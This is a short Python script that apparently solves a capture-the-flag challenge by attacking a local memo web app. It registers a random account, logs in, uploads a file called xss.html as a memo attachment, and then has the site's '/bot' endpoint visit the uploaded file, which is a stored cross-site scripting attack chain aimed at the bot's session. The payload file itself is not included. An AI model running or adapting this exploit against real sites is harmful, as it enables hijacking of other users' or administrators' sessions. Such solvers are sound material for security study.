import requests, os, time

HOST = '127.0.0.1'
URL_MEMO = f'http://{HOST}:3000'
URL_FILE = f'http://127.0.0.1:8000'

USERNAME = os.urandom(8).hex()
PASSWORD = os.urandom(8).hex()

USER = requests.Session()

def register():
    r = USER.post(URL_MEMO + '/register', data={'email': USERNAME, 'password': PASSWORD})
    print(r.text)

def login():
    r = USER.post(URL_MEMO + '/login', data={'email': USERNAME, 'password': PASSWORD})
    print(r.text)

def upload_file(ch):
    r = USER.post(URL_MEMO + '/memo', files={
            'file': (f'xss.html', open('xss.html', 'rb'))
        }, data={
            'title': 'xss', 'content': 'xss'
        }
    )
    print(r.text)

def bot(ch):
    r = USER.post(URL_MEMO + '/bot', data={'url': f'{URL_FILE}/uploads/xss.html'})
    print(r.text)

def main(ch):
    register()
    login()
    upload_file(ch)
    bot(ch)

main('\r')